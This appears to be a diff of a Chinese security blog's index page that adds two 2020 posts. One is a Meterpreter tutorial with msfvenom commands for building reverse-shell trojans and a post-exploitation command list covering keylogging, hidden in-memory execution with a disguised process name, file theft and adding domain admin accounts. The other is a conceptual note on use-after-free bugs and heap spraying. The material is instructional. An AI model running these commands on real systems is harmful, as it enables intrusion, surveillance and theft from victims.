@@ -197,7 +197,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/chrome-bug/" style="font-size: 10px;">chrome_bug</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a>
+                        <a href="/tags/chrome/" style="font-size: 15px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 10px;">chrome_bug</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a>
                     </div>
                 </section>
                 
@@ -281,6 +281,329 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-初识Meterpreter" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/05/25/%E5%88%9D%E8%AF%86Meterpreter/" class="article-date">
+      <time datetime="2020-05-25T06:05:46.130Z" itemprop="datePublished">2020-05-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/05/25/%E5%88%9D%E8%AF%86Meterpreter/">初识Meterpreter</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h2><p>metrepreter 是metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道，使用它作为攻击载荷能够获得目标系统的一个meterpreter shell的链接。</p>
+<blockquote>
+<p>meterpreter shell作为渗透模块有很多有用的功能，如：添加用户、隐藏、打开shell、得到用户密码、上传下载远程主机文件、运行cmd、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息 网络接口 ip地址等信息。<br>Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，不改变系统硬盘中的文件<br>Meterpreter 是一种后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型payload，此工具基于内存DLL注入理念实现，通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现。</p>
+</blockquote>
+<h2 id="Meterpreter中常用反弹类型"><a href="#Meterpreter中常用反弹类型" class="headerlink" title="Meterpreter中常用反弹类型"></a>Meterpreter中常用反弹类型</h2><h3 id="1-reverse-tcp"><a href="#1-reverse-tcp" class="headerlink" title="1.reverse_tcp"></a>1.reverse_tcp</h3><p>基于TCP的反向链接反弹shell，使用稳定。</p>
+<ul>
+<li><p>Linux:</p>
+<ul>
+<li>linux下反弹shell木马：</li>
+<li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell</code></li>
+<li>目录下生成木马文件isshell，为文件加可执行权限，打开metasploit，使用模块handler设置payload(与生成木马所使用payload一致)</li>
+<li>设置地址和端口，开始监听。</li>
+<li>运行反弹shell木马，成功反弹回shell</li>
+</ul>
+</li>
+<li><p>Windows:</p>
+<ul>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的ip] lport=[端口] -f exe -o [要生成的文件名]</code></li>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="2-reverse-http"><a href="#2-reverse-http" class="headerlink" title="2.reverse_http"></a>2.reverse_http</h3><p>基于http方式的反向连接，网速慢的情况下不稳定。</p>
+<p><code>payload: /windows/meterpreter/reverse_http</code></p>
+<h3 id="3-reverse-https"><a href="#3-reverse-https" class="headerlink" title="3.reverse_https"></a>3.reverse_https</h3><p>基于https方式的反向连接，网速慢的情况下不稳定，https若反弹没收到数据，可以将监听端口换成443试试。</p>
+<p><code>payload: /windows/meterpreter/reverse_https</code></p>
+<h3 id="4-bind-tcp"><a href="#4-bind-tcp" class="headerlink" title="4.bind_tcp"></a>4.bind_tcp</h3><p>基于TCP的正向连接shell，一般在内网使用，不需要设置LHOST。</p>
+<p><code>msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell</code></p>
+<p>加权运行。</p>
+<h2 id="Meterpreter-常用命令"><a href="#Meterpreter-常用命令" class="headerlink" title="Meterpreter 常用命令"></a>Meterpreter 常用命令</h2><p>###1.基本命令</p>
+<ul>
+<li><p>help –查看Meterpreter帮助</p>
+</li>
+<li><p>background –返回，把meterpreter后台挂起</p>
+</li>
+<li><p>bgkill –杀死一个背景 meterpreter 脚本</p>
+</li>
+<li><p>bglist –提供所有正在运行的后台脚本的列表</p>
+</li>
+<li><p>bgrun –作为一个后台线程运行脚本</p>
+</li>
+<li><p>channel –显示活动频道</p>
+</li>
+<li><p>sessions -i number  –与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</p>
+</li>
+<li><p>sesssions -k  number  –与会话进行交互</p>
+</li>
+<li><p>close –关闭通道</p>
+</li>
+<li><p>exit –终止 meterpreter 会话</p>
+</li>
+<li><p>quit –终止 meterpreter 会话</p>
+</li>
+<li><p>interact id  –切换进一个信道</p>
+</li>
+<li><p>run –执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</p>
+</li>
+<li><p>irb –进入 Ruby 脚本模式</p>
+</li>
+<li><p>read –从通道读取数据</p>
+</li>
+<li><p>write –将数据写入到一个通道</p>
+</li>
+<li><p>run和bgrun –前台和后台执行以后它选定的 meterpreter 脚本</p>
+</li>
+<li><p>use –加载 meterpreter 的扩展</p>
+</li>
+<li><p>load/use –加载模块</p>
+</li>
+<li><p>Resource –执行一个已有的rc脚本</p>
+<h3 id="2-文件系统命令"><a href="#2-文件系统命令" class="headerlink" title="2.文件系统命令"></a>2.文件系统命令</h3></li>
+<li><p>cat c:\boot.ini –查看文件内容,文件必须存在</p>
+</li>
+<li><p>del c:\boot.ini –删除指定的文件</p>
+</li>
+<li><p>upload /root/Desktop/netcat.exe c:\  –上传文件到目标机主上，如upload  setup.exe C:\windows\system32\</p>
+</li>
+<li><p>download nimeia.txt /root/Desktop/   –下载文件到本机上如：download C:\boot.ini /root/或者download C:\“ProgramFiles”\Tencent\QQ\Users\295<strong>**</strong>125\Msg2.0.db /root/</p>
+</li>
+<li><p>edit c:\boot.ini   –编辑文件</p>
+</li>
+<li><p>getlwd –打印本地目录</p>
+</li>
+<li><p>getwd –打印工作目录</p>
+</li>
+<li><p>lcd –更改本地目录</p>
+</li>
+<li><p>ls –列出在当前目录中的文件列表</p>
+</li>
+<li><p>lpwd –打印本地目录</p>
+</li>
+<li><p>pwd –输出工作目录</p>
+</li>
+<li><p>cd c:\  –进入目录文件下</p>
+</li>
+<li><p>rm file  –删除文件</p>
+</li>
+<li><p>mkdir dier  –在受害者系统上的创建目录</p>
+</li>
+<li><p>rmdir –受害者系统上删除目录</p>
+</li>
+<li><p>dir –列出目标主机的文件和文件夹信息</p>
+</li>
+<li><p>mv –修改目标主机上的文件名</p>
+</li>
+<li><p>search -d d:\www -f web.config  –search 文件，如search  -d c:\  -f*.doc</p>
+</li>
+<li><p>meterpreter &gt; search -f autoexec.bat   –搜索文件</p>
+</li>
+<li><p>meterpreter &gt; search -f sea*.bat c:\xamp\</p>
+</li>
+<li><p>enumdesktops      –用户登录数</p>
+</li>
+<li><p>下载文件:使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件</p>
+</li>
+<li><p>上传文件: upload 命令为上传文件到我们的目标机器</p>
+</li>
+<li><p>查看文件: cat filename 在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。</p>
+</li>
+<li><p>切换、查询当前路径: pwd 命令将查询当前在dos命令下的路径，“cd”命令可以改变当前路径</p>
+</li>
+<li><p>sysinfo 命令: 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是windows XP service pack 2，sp2这个系统有很多漏洞。</p>
+</li>
+<li><p>execute命令: 为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f为执行要运行的命令</p>
+<ul>
+<li>如果希望隐藏后台执行，加参数-H <code>execute  -H -f notepad.exe</code></li>
+<li>我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上 <code>execute  -H -i -f cmd.exe</code></li>
+<li>在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀  <code>execute  -H -m -d notepad.exe-f  wce.exe -a &quot;-o wce.txt&quot;</code><ul>
+<li>-d 在目标主机执行时显示的进程名称（用以伪装）</li>
+<li>-m 直接从内存中执行</li>
+<li>-o wce.txt 是wce.exe的运行参数</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>idletime命令:为显示目标机器截止到当前无操作命令的时间</p>
+</li>
+<li><p>search命令:在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。使用<code>search –h</code>命令来查看search命令的帮助信息</p>
+</li>
+<li><p>edit命令: 调用vi编辑器，对目标主机上的文件修改</p>
+<h3 id="3-网络命令"><a href="#3-网络命令" class="headerlink" title="3.网络命令"></a>3.网络命令</h3></li>
+<li><p>ipconfig/ifconfig –显示网络接口的关键信息，包括 IP 地址</p>
+</li>
+<li><p>portfwd  add -l 4444 -p 3389 -r 192.168.1.102  –端口转发,本机监听4444,把目标机3389转到本机4444</p>
+</li>
+<li><p>netstat -an | grep“4444”   –查看指定端口开放情况</p>
+</li>
+<li><p>rdesktop -u Administrator -p bk#123 127.0.0.1:4444  –使用rdesktop来连接桌面，-u 用户名 -p 密码</p>
+</li>
+<li><p>rdesktop 127.1.1.0:4444  –需要输入用户名和密码远程连接</p>
+</li>
+<li><p>route –查看或修改受害者路由表</p>
+<ul>
+<li>route add 192.168.1.0 255.255.255.0 1  –添加动态路由</li>
+<li>route print  –路由表输出</li>
+</ul>
+</li>
+<li><p>runget_local_subnets  –目标主机的内网IP段情况</p>
+</li>
+<li><p>Arp       –看ARP缓冲表</p>
+</li>
+<li><p>Getproxy     –获取代理</p>
+</li>
+<li><p>portfwd：网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。</p>
+<h3 id="4-键盘监听"><a href="#4-键盘监听" class="headerlink" title="4.键盘监听"></a>4.键盘监听</h3></li>
+<li><p>keyscan_start：开启键盘记录功能</p>
+</li>
+<li><p>keyscan_dump：显示捕捉到的键盘记录信息</p>
+</li>
+<li><p>keyscan_stop：停止键盘记录功能</p>
+</li>
+<li><p>uictl enable keyboard/mouse –接管目标主机的键盘和鼠标。</p>
+<h3 id="5-系统命令"><a href="#5-系统命令" class="headerlink" title="5.系统命令"></a>5.系统命令</h3></li>
+<li><p>reboot –重新启动受害人的计算机</p>
+</li>
+<li><p>reg –与受害人的注册表进行交互</p>
+</li>
+<li><p>rev2self  –回到控制目标主机的初始用户账户下</p>
+</li>
+<li><p>shell –获得控制台权限</p>
+</li>
+<li><p>shutdown –关闭了受害者的计算机</p>
+</li>
+<li><p>sysinfo  –查看目标机系统信息，如机器名，操作系统等</p>
+</li>
+<li><p>add_user username password -h ip     –在远程目标主机上添加一个用户</p>
+</li>
+<li><p>add_group_user “Domain Admins” username -h ip    –将用户添加到目标主机的域管理员组中</p>
+</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome/" rel="tag">chrome</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-UAF漏洞简单学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/05/25/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2020-05-25T04:53:14.169Z" itemprop="datePublished">2020-05-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/05/25/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">UAF漏洞简单学习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>UAF漏洞是一种内存破坏漏洞，通常存在于浏览器中。</p>
+<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>uaf漏洞成因：一块堆内存被释放之后又被使用。<br>再一次被使用是指：指针存在（悬垂指针被引用）引用结果不可预测。</p>
+<p>由于大多数堆内存都是C++对象，所以利用的核心思路即：分配堆去占坑，占的坑中又自己构造的虚表。</p>
+<h2 id="分析方式"><a href="#分析方式" class="headerlink" title="分析方式"></a>分析方式</h2><p>分析uaf漏洞的要点在于弄清楚对象是在哪里被分配，被释放，被重用。</p>
+<p>uaf异常触发点：对已释放的对象进行操作导致的异常，所以异常点即重用点。</p>
+<p>而由于是对对象的操作，可以列出这个对象的所有方法，找出分配和释放的方法，对其下断来分析uaf过程。</p>
+<blockquote>
+<p>1.悬垂指针：指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针，比如一个对象的指针，如果这个对象已经被释放或者回收，但是指针没有进行任何的修改，仍然执行已被释放的内存，这个指针就叫做悬垂指针。</p>
+<p>2.UAF漏洞：Use-AFTER-Free是一种内存破坏漏洞，简单来说，漏洞的原因是使用了悬垂指针。</p>
+</blockquote>
+<p>常见与UAF漏洞配合使用的是堆喷射，分配大量内存，增大靶子的面积，使eip跳进分配的内存中，而分配的内存中又充满了滑板指令，只要命中了滑板指令就可以命中shellcode</p>
+<h2 id="调试方式"><a href="#调试方式" class="headerlink" title="调试方式"></a>调试方式</h2><p>对于uaf漏洞，调试器捕获到的异常并不是漏洞发生的第一现场，所以一般要使用gflags开启PageHeap和UST（windbg自带gflags工具）</p>
+<p><code>gflags.exe /i 程序名.exe +hpa +ust</code></p>
+<p>这样调试器会定位到最先出错的位置。</p>
+<blockquote>
+<p>技巧：<br>1.在ida中查找函数后，在windbg下断<br>2.打开poc文件后出现crash就是对象被重用，根据crash地址来找到重用的对象起始地址<br>3.对对象起始使用 <code>!heap -p -a 地址</code> 可获得这个对象的分配信息，由回溯还可以知道是什么函数分配的。<br>4.对分配函数下断到达分配现场<br>5.在回溯中，分配函数一般为RtlAllocateHeap的上层，而释放函数一般就是FreeHeap的上层。</p>
+</blockquote>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome/" rel="tag">chrome</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-CVE-2019-5786" class="article article-type-post" itemscope itemprop="blogPost">
   
